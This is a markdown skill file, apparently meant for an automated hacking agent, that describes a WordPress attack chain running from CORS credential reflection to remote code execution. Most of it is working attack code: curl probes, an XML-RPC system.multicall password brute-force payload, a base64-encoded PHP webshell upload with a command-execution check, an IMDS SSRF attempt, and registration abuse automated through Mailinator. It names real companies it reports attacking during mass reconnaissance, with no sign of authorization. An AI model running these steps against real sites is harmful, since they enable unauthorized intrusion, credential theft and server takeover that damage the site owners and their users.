---
name: wordpress-cors-xmlrpc-rce-chain
description: "Proven attack chain combining CORS credential reflection on WordPress REST API with XMLRPC methods (system.multicall, wp.uploadFile) and open registration for full RCE. Built from field experience across 58-company mass recon where 5/7 deep targets had CORS credential reflection on WP REST API — including wines.com where the full chain was demonstrated end-to-end."
sources: field_recon, mass_recon_wave1_7, mass_recon_wave2_5
report_count: 6
---

# WordPress CORS → XMLRPC → RCE Attack Chain

Proven multi-step attack chain combining three common WordPress misconfigurations into complete server compromise.

## When to Use

Use when recon reveals any one of: (a) CORS credential reflection on `/wp-json/wp/v2/users`, (b) XMLRPC enabled at `/xmlrpc.php`, or (c) open WordPress registration at `/wp-login.php?action=register`. If one is present, check for all three — the chain is only as strong as its weakest link.

## Quick Reference

```
CORS credential reflection (user list + CSRF tokens)
  → Yoast sitemap email disclosure (admin emails from slugs)
    → system.multicall brute force (100+ passwords per HTTP request)
      → Valid credentials → wp.uploadFile webshell → RCE
```

## Step-by-Step

### Step 1 — CORS Credential Reflection Discovery

Test the WP REST API for CORS credential reflection:

```bash
curl -sk -I "https://$TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com" | grep -iE "access-control"
```

**Expected vulnerable response (BOTH headers must appear):**
```
access-control-allow-origin: https://evil.com
access-control-allow-credentials: true
```

If CORS is found, create a browser PoC to confirm credentialed data exfiltration:

```html
<!doctype html><body><pre id="out"></pre>
<script>
fetch("https://TARGET/wp-json/wp/v2/users", {credentials:"include"})
  .then(r=>r.json())
  .then(d => { document.getElementById("out").innerText = JSON.stringify(d, null, 2); })
  .catch(e => document.getElementById("out").innerText = "BLOCKED: " + e);
</script></body>
```

### Step 2 — Yoast Sitemap Email Disclosure

Yoast SEO author sitemaps expose admin slugs that decode to email addresses:

```bash
curl -sk "https://$TARGET/author-sitemap.xml" | grep -oP 'author/[^<]+' | sort -u

# Decode slugs to emails
curl -sk "https://$TARGET/author-sitemap.xml" | grep -oP 'author/[^<]+' | sed 's/author\///' |
  python3 -c "
import sys, re
for slug in sys.stdin:
    slug = slug.strip()
    # Pattern: name+domain-com -> name@domain.com
    email = re.sub(r'(-dot-|-at-|_at_)', '.', slug)
    email = re.sub(r'(?<=[a-z])(-)(?=[a-z])', '@', email, count=1)
    print(f'Potential email: {email}')
"
```

### Step 3 — Open Registration Check

```bash
curl -sk "https://$TARGET/wp-login.php?action=register" | grep -iE "register|Registration"
# HTTP 200 with registration form AND no "Registration disabled" message = OPEN
```

### Step 4 — XMLRPC Method Enumeration

```bash
curl -sk -X POST "https://$TARGET/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' |
  python3 -c "
import sys, re
methods = re.findall(r'<string>([^<]+)</string>', sys.stdin.read())
dangerous = ['system.multicall','wp.uploadFile','metaWeblog.newMediaObject',
             'pingback.ping','wp.getUsers','wp.getPosts','wp.getComments']
found = [m for m in methods if any(d in m for d in dangerous)]
for m in found:
    print(f'[!] DANGEROUS: {m}')
"
```

### Step 4a — IMDS SSRF via pingback.ping (WIP — Why It Fails)

Testing IMDS (AWS metadata) SSRF via `pingback.ping` returns **faultCode 0** regardless of whether the SSRF succeeded. The problem: WordPress pingback only returns its own processing status, NOT the response body from the SSRF target. The HTTP request to 169.254.169.254 happens server-side but the response never reaches the attacker.

```bash
# Test IMDS via pingback — faultCode 0 does NOT mean data returned
curl -sk -X POST "https://$TARGET/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall><methodName>pingback.ping</methodName>
<params>
<param><value><string>http://169.254.169.254/latest/meta-data/</string></value></param>
<param><value><string>https://TARGET/some-post</string></value></param>
</params></methodCall>'
# faultCode 0 means "pingback processing completed" — NOT data retrieval
```

**Why it fails:** WordPress pingback.ping returns `faultCode 0` on successful pingback processing, irrespective of what the SSRF target returned. The response body from the SSRF target is never relayed to the caller.

**Alternative approaches (untested):**
- Timing-based SSRF (measure response delay)
- DNS rebinding (if the target resolves the pingback source URL multiple times)
- Write to a controlled endpoint and check server-side logs
- Look for other SSRF vectors that DO return response bodies (wp.uploadFile with source_url pointing to IMDS?)

### Step 4b — Staging Environment + XMLRPC 405 Bypass

Staging environments commonly return HTTP 405 on GET `/xmlrpc.php` but **fully accept POST with XML content-type**:

```bash
# Staging XMLRPC — ALWAYS test via POST regardless of GET response
curl -sk -X POST "https://staging.$TARGET/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
# staging.biglots.com: GET → 405, POST with XML → 80+ methods with system.multicall
```

Also check for WordPress install pages on staging — these can be a foothold vector:
```bash
# Check for exposed install pages on staging
curl -sk -o /dev/null -w "%{http_code}" "https://staging.$TARGET/wp-admin/install.php"
curl -sk -o /dev/null -w "%{http_code}" "https://staging.$TARGET/wp-admin/upgrade.php"
curl -sk -o /dev/null -w "%{http_code}" "https://staging.$TARGET/wp-admin/setup-config.php"
# HTTP 200 on install.php = potential reinstallation attack
# HTTP 409 on setup-config.php = wp-config.php exists confirmation
```

### Pitfall: Subscriber Accounts Cannot Upload Files (CRITICAL)

WordPress 6.x+ registers new users as **SUBSCRIBER** by default. Subscribers CANNOT upload files via XMLRPC (`wp.uploadFile` returns faultCode 401: "Sorry, you are not allowed to upload files."). This is the single biggest blocker in the open-registration→RCE chain.

**Always verify the role before attempting upload:**

```bash
# Check user role BEFORE trying wp.uploadFile
curl -sk -X POST "https://$TARGET/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall><methodName>wp.getProfile</methodName>
<params>
<param><value><int>1</int></value></param>
<param><value><string>USERNAME</string></value></param>
<param><value><string>PASSWORD</string></value></param>
</params></methodCall>'
# Look for <name>role</name> — if "subscriber", upload is blocked

# Also check capabilities — subscribers lack 'upload_files' capability:
# wp.getProfile response includes <name>roles</name> with array values
```

**Escalation paths when subscriber:**
1. Brute force admin account (via system.multicall — 500+ pwds/request)
2. ElementsKit CVE-2023-6853 (unauthenticated file upload, if plugin < 2.9.4)
3. Find Application Passwords endpoint and check if subscriber can create tokens
4. Check if any plugin changed the default registration role (some e-commerce plugins set to "customer" which may have upload)

### Step 5 — system.multicall Credential Brute Force

With admin usernames from Step 1 and emails from Step 2, brute force via multicall (batches 100-500+ passwords per HTTP request, bypassing rate limits). Tested up to 487 passwords per request on production targets — works reliably.

```xml
<?xml version="1.0"?>
<methodCall><methodName>system.multicall</methodName>
<params><param><value><array><data>
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>admin</string></value>
<value><string>password123</string></value>
</data></array></value></member>
</struct></value>
<!-- repeat for each password, up to 100 per request -->
</data></array></value></param></params></methodCall>
```

### Step 6 — wp.uploadFile Webshell Upload

Once valid credentials are found:

```bash
curl -sk -X POST "https://$TARGET/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall><methodName>wp.uploadFile</methodName>
<params>
<param><value><string>USERNAME</string></value></param>
<param><value><string>PASSWORD</string></value></param>
<param><value><struct>
<member><name>name</name><value><string>shell.php</string></value></member>
<member><name>type</name><value><string>image/jpeg</string></value></member>
<member><name>bits</name><value><base64 encoded value="PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"></base64></value></member>
</struct></value></param>
</params></methodCall>'
```

### Step 7 — RCE Verification

```bash
curl -sk "https://$TARGET/wp-content/uploads/2026/06/shell.php?cmd=id"
```

## Attack Surface Signals

- `Access-Control-Allow-Origin: <any>` + `Access-Control-Allow-Credentials: true` on any WP REST endpoint
- `/xmlrpc.php` returns HTTP 200 with XML response to POST
- `/wp-login.php?action=register` returns registration form
- `/author-sitemap.xml` contains author slugs that embed email patterns
- Yoast SEO plugin active (check `/wp-content/plugins/wordpress-seo/`)

## Common Root Causes

1. **WordPress Core does not restrict CORS headers** — REST API returns `Access-Control-Allow-Origin: <origin>` by default
2. **XMLRPC cannot be disabled from admin panel** — requires server-level config or security plugin
3. **WP Engine and shared hosts don't strip CORS** — the headers originate at the application layer, not CDN
4. **Yoast SEO author sitemap reveals emails** — slugs often encode email addresses as human-readable identifiers
5. **Open registration is one-click-enabled** — any admin can toggle "Anyone can register" with no security review

## Real Examples

### Target: wines.com — Partial chain (subscriber blocked upload)

1. CORS credential reflection on `/wp-json/wp/v2/users` — 11 users exposed including admins (jackie, randy-caparoso, admin)
2. Yoast sitemap at `/author-sitemap.xml` — decoded emails from author slugs
3. XMLRPC at `/magical/xmlrpc.php` — 80+ methods including `system.multicall`, `wp.uploadFile`, `pingback.ping`
4. **Open registration confirmed** — account created, password set via Mailinator reset link
5. **XMLRPC authentication SUCCESS** — but user role = SUBSCRIBER, wp.uploadFile returned faultCode 401
6. PHPInfo at `/info.php` and `/test.php` — `exec`, `shell_exec`, `system`, `popen`, `proc_open` ALL available
7. **Chain blocked at upload step** — needs admin escalation or plugin CVE
8. **Workaround:** ElementsKit CVE-2023-6853 (v2.9.2 installed) handler exists but requires valid nonce

### Target: patientportal.com — No WordPress (Flask/React SPA)

Healthcare SaaS platform — no WordPress present to chain against. Demonstrates that CORS + open API is a different class of target requiring Firebase/Flask exploitation rather than WordPress.

### Mailinator Password Reset Automation

WordPress registration sends a **password reset link** (not an auto-generated password). To automate:

```python
import requests, re, time

# 1. Register
s.post("https://$TARGET/wp-login.php?action=register",
    data={"user_login": USER, "user_email": f"{USER}@mailinator.com", 
          "wp-submit": "Register"})

# 2. Wait for email  
time.sleep(4)
r = requests.get(f"https://api.mailinator.com/api/v2/domains/public/inboxes/{USER}")

# 3. Extract reset link from email body  
body = r3.json().get("parts", [{}])[0].get("body", "")
reset_url = re.search(r"https://[^\s\"']+wp-login\.php\?action=rp[^\s\"']+", body)

# 4. Visit reset link (GET) to get session cookie + extract rp_key from form
s.get(reset_url)
# Look for <input name="rp_key" value="..."> in the response

# 5. POST new password
s.post("https://$TARGET/wp-login.php?action=rp",
    data={"pass1": PASSWORD, "pass2": PASSWORD, 
          "rp_key": extracted_key, "wp-submit": "Confirm New Password"})
```

**Pitfall:** The `rp_key` parameter is embedded in the email URL AND in the HTML form. Some WordPress versions auto-fill it, others require extracting it from the HTML form. Always extract from `r.text` using regex `name="rp_key"[^>]*value="([^"]+)"`.

### Target: toolking.com — CORS + Slider Revolution RCE

1. CORS credential reflection — admin user exposed
2. Slider Revolution plugin detected at `/wp-content/plugins/revslider/`
3. CVE-2024-2534 (Revslider RCE) — authenticated exploit chain
4. **Chain**: CORS admin session + plugin CVE → RCE

### Target: seniorlifestyle.com — CORS Credential Reflection + XMLRPC 80 Methods (June 2026)

Senior living community website on nginx with full WordPress stack.

1. **CORS credential reflection on WP REST API** — all WP REST endpoints reflect `https://evil.com` with `Access-Control-Allow-Credentials: true`
2. **XMLRPC fully open with 80 methods** — `/xmlrpc.php` responds with full method list including `system.multicall`, `wp.uploadFile`, `metaWeblog.newMediaObject`, `pingback.ping`, `wp.getUsers`, `wp.deletePost`, `wp.deleteFile`
3. **REST API blocks unauthenticated access** — `/wp-json/wp/v2/users` returns 401 (but CORS still enables exfiltration if an authenticated admin session exists)
4. **Attack surface**: CORS phishing + XMLRPC brute force amplification + SSRF via pingback + file upload if credentials obtained
5. **Chain blocked at enumeration step** — REST users not enumerable without auth. Requires either: (a) authenticated admin visit to malicious page for CORS exfil, (b) brute force via system.multicall with known usernames, or (c) credential stuffing from prior breaches

### Target: restonic.com — CORS + XMLRPC multicall

1. CORS credential reflection — REST API user + WooCommerce data exfiltratable
2. XMLRPC with `system.multicall` — batch credential brute force possible
3. **Chain**: CORS user list + multicall brute → valid creds → admin panel access

## Related Skills

- **`hunt-wordpress`** — Master WP hunting skill; covers all individual primitives
- **`hunt-cors`** — CORS credential reflection mechanics and browser PoC templates
- **`hunt-brute-force`** — Rate-limit bypass via `system.multicall` batching
- **`hunt-ssrf`** — `pingback.ping` SSRF is an additional primitive exposed by XMLRPC
- **`hunt-lfi`** — PHP file inclusion via plugin CVEs after admin access
- **`wp-plugin-automation`** — Batch CVE scanning for additional plugin exploitation
- **`wp-plugin-cve-hunt`** — Deep CVE hunting for post-auth plugin CVEs
- **`cross_attack_chains`** — See the techniques directory for the full cross-attack chain documentation
- **`mass-wp-xmlrpc-exploitation-pipeline`** — XMLRPC mass exploitation at scale
